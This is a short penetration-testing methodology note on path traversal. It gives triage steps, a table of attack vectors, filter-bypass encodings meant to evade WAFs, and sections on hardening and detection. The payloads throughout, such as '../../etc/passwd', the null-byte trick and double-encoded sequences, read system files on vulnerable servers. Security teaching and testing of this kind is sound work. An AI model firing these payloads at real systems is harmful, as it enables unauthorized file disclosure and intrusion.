# Path traversal — methodology

## Triage

1. **Find the file-reading sink.** Static-file endpoints, file-download features,
   image / avatar fetch, file-import features, language switchers (`?lang=`),
   template selectors (`?template=`).
2. **Probe with controlled-target.** `?file=../../../../etc/passwd` (Linux) or
   `?file=..\..\..\..\windows\win.ini` (Windows). Use enough `..` for the level.
3. **Confirm.** Response contains familiar content from that file.

## Common patterns

| Surface | Vector |
|---------|--------|
| Static file download | `?file=../../etc/passwd` |
| Image fetch by name | `?image=../../etc/passwd%00.jpg` (PHP <5.3.4 null-byte) |
| Archive upload | Symlink in zip → extract to controlled path |
| Template selector | `?theme=../admin/index` |
| Language file | `?lang=../../../etc/passwd` |

## Filter bypass tricks

- URL-encoding: `%2e%2e%2f`
- Double URL-encoding: `%252e%252e%252f`
- Unicode: `%c0%ae%c0%ae/`
- 16-bit Unicode: `%u002e%u002e/`
- Backslash on Windows: `..\..\..\..\windows\win.ini`
- Absolute path: `/etc/passwd` (sometimes filters only block `..`)
- Path normalization quirks: `....//....//etc/passwd`, `....\/....\/etc/passwd`

## Hardening

- Resolve path → canonicalize → verify it's under the allowed base directory.
- Never concatenate user input with a filesystem path. Use a strict allowlist keyed
  on user input (e.g. `themes[user_input]`).
- Sandbox at filesystem level if available (chroot, OS-level fs sandboxing).

## Detection

- Log every file-read with the original requested path AND the canonicalized result.
  Discrepancy → alarm.
- WAFs match `..` and percent-encoded variants; novel double-encoding is the operator's edge.

## References

- PortSwigger — Path traversal labs.
- OWASP — File and Path Inclusion Cheat Sheet.
